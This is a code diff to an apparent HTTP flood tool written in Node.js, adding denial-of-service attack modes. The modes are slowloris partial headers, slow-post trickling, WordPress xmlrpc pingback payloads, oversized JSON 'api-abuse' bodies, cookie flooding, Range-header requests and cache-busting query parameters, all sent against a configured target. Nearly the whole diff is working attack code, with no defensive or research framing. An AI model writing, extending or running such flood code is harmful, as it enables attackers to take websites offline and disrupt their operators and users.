@@ -223,7 +223,8 @@ function getRandomHeaders(config) {
       'Sec-Fetch-Dest': 'document',
       'Sec-Fetch-Mode': 'navigate',
       'Sec-Fetch-Site': 'none',
-      'Sec-Fetch-User': '?1'
+      'Sec-Fetch-User': '?1',
+      'X-Requested-With': 'XMLHttpRequest'
     };
     
     // Randomly add some extra headers
@@ -241,12 +242,83 @@ function getRandomHeaders(config) {
       'https://www.facebook.com/',
       'https://www.twitter.com/',
       'https://www.reddit.com/',
-      'https://www.youtube.com/'
+      'https://www.youtube.com/',
+      'https://www.bing.com/',
+      'https://www.instagram.com/'
     ];
     headers['Referer'] = referers[Math.floor(Math.random() * referers.length)];
   }
   
+  // Cookie flooding
+  if (config.cookieFlood) {
+    const cookies = [];
+    for (let i = 0; i < 10; i++) {
+      cookies.push(`session_${i}=${Math.random().toString(36).substring(7)}`);
+    }
+    headers['Cookie'] = cookies.join('; ');
+  }
+  
+  // Range header attack (causes multiple chunks)
+  if (config.rangeHeader) {
+    const start = Math.floor(Math.random() * 1000);
+    headers['Range'] = `bytes=${start}-${start + 50}`;
+  }
+  
   return headers;
+}
+
+function getAttackPath(config, url) {
+  let path = url.pathname + url.search;
+  
+  // Cache busting with random query params
+  if (config.cacheBust) {
+    const separator = url.search ? '&' : '?';
+    path += `${separator}_=${Date.now()}${Math.random()}`;
+  }
+  
+  // Random query parameters
+  if (config.randomParams) {
+    const separator = path.includes('?') ? '&' : '?';
+    const randomParams = [
+      `v=${Math.floor(Math.random() * 99999)}`,
+      `t=${Date.now()}`,
+      `r=${Math.random().toString(36).substring(7)}`,
+      `cb=${Math.floor(Math.random() * 999999)}`
+    ];
+    path += separator + randomParams[Math.floor(Math.random() * randomParams.length)];
+  }
+  
+  return path;
+}
+
+function getAttackPayload(config) {
+  const mode = config.attackMode || 'standard';
+  
+  switch(mode) {
+    case 'xmlrpc':
+      return `<?xml version="1.0"?>
+<methodCall>
+  <methodName>pingback.ping</methodName>
+  <params>
+    <param><value><string>${config.target}</string></value></param>
+    <param><value><string>${config.target}</string></value></param>
+  </params>
+</methodCall>`;
+    
+    case 'api-abuse':
+      return JSON.stringify({
+        data: Array(100).fill('x'.repeat(100)).join(''),
+        timestamp: Date.now(),
+        nonce: Math.random().toString(36)
+      });
+    
+    case 'slow-post':
+      // Return partial data to keep connection open
+      return 'data=' + 'A'.repeat(10);
+    
+    default:
+      return config.postData || '';
+  }
 }
 
 function sendRequestNoWait(config, resolvedIP) {
@@ -255,20 +327,34 @@ function sendRequestNoWait(config, resolvedIP) {
     const url = new URL(config.target);
     const protocol = url.protocol === 'https:' ? https : http;
     const agent = url.protocol === 'https:' ? httpsAgent : httpAgent;
+    const mode = config.attackMode || 'standard';
     
     const options = {
-      hostname: resolvedIP || url.hostname, // Use resolved IP if available
+      hostname: resolvedIP || url.hostname,
       port: url.port || (url.protocol === 'https:' ? 443 : 80),
-      path: url.pathname + url.search + (config.cacheBust ? `?_=${Date.now()}${Math.random()}` : ''),
+      path: getAttackPath(config, url),
       method: config.method,
       headers: getRandomHeaders(config),
-      timeout: 5000,
+      timeout: mode === 'slowloris' ? 300000 : 5000, // 5 minutes for slowloris
       agent: agent
     };
     
     // Add Host header when using IP
     if (resolvedIP) {
       options.headers['Host'] = url.hostname;
+    }
+    
+    // XML-RPC specific headers
+    if (mode === 'xmlrpc') {
+      options.method = 'POST';
+      options.headers['Content-Type'] = 'text/xml';
+      options.path = '/xmlrpc.php';
+    }
+    
+    // API abuse headers
+    if (mode === 'api-abuse') {
+      options.method = 'POST';
+      options.headers['Content-Type'] = 'application/json';
     }
     
     const req = protocol.request(options, (res) => {
@@ -285,12 +371,40 @@ function sendRequestNoWait(config, resolvedIP) {
       req.destroy();
     });
     
-    // Add POST body if needed
-    if (config.method === 'POST' && config.postData) {
-      req.write(config.postData);
+    // Handle different attack modes
+    if (mode === 'slowloris') {
+      // Send partial headers slowly
+      req.write('X-');
+      setTimeout(() => {
+        if (!req.destroyed) {
+          req.write('a: b\r\n');
+        }
+      }, 10000);
+      // Don't end the request - keep it hanging
+    } else if (mode === 'slow-post') {
+      // Send data very slowly
+      const payload = getAttackPayload(config);
+      let sent = 0;
+      const interval = setInterval(() => {
+        if (sent < payload.length && !req.destroyed) {
+          req.write(payload.charAt(sent));
+          sent++;
+        } else {
+          clearInterval(interval);
+          req.end();
+        }
+      }, 1000);
+    } else {
+      // Normal request with payload
+      const payload = getAttackPayload(config);
+      if (payload && (config.method === 'POST' || config.method === 'PUT' || config.method === 'PATCH')) {
+        if (mode === 'xmlrpc') {
+          options.headers['Content-Length'] = Buffer.byteLength(payload);
+        }
+        req.write(payload);
+      }
+      req.end();
     }
-    
-    req.end();
     
   } catch (error) {
     stats.failed++;
